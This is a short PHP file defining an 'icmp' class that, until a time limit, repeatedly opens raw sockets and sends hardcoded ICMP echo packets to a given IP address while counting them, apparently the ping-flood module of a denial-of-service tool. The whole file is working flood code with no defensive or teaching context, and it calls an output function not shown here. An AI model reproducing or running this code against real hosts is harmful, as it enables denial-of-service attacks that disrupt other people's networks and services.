<?php
class icmp{
	function icmp($ip, $starttime, $lenght, $max_time, $exec_time){
		while(1){ 
			try{
			$packets++; 
						if(time() > $max_time){
							output($packets, $starttime, $exec_time, $lenght);
							break; 
						}
							$package = "\x08\x00\x19\x2f\x00\x00\x00\x00\x70\x69\x6e\x67";
							$socket = socket_create(AF_INET, SOCK_RAW, 1);
							socket_set_option($socket, SOL_SOCKET, SO_RCVTIMEO, array("sec" => 1, "usec" => 0));
							socket_connect($socket, $ip, null);
							socket_send($socket, $package, strlen($package), 0);
			}
			catch (Exception $e){
				echo $e;
			}
		}
	}
}
?>